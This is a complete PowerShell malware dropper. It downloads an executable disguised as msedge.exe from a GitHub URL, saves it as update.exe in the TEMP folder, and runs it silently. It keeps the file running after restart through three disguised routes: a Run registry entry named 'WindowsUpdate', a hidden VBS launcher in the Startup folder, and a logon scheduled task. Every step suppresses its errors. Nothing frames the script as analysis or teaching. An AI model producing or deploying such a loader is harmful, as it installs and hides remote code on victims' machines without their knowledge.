# Absolute minimal script with just core functionality
$url = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$path = "$env:TEMP\update.exe"

# Try to download
try {
    (New-Object Net.WebClient).DownloadFile($url, $path)
} catch {
    # Silent failure
}

# Add to startup
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "`"$path`" /silent" -Force
} catch {
    # Silent failure
}

# Create startup VBS
try {
    $folder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $vbs = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "$path /silent", 0, False
"@
    $vbs | Out-File -FilePath "$folder\update.vbs" -Encoding ASCII
} catch {
    # Silent failure
}

# Simple scheduled task approach
try {
    $action = New-ScheduledTaskAction -Execute $path -Argument "/silent"
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Force
} catch {
    # Silent failure
}

# Try to run now
try {
    Start-Process $path -ArgumentList "/silent"
} catch {
    # Silent failure
}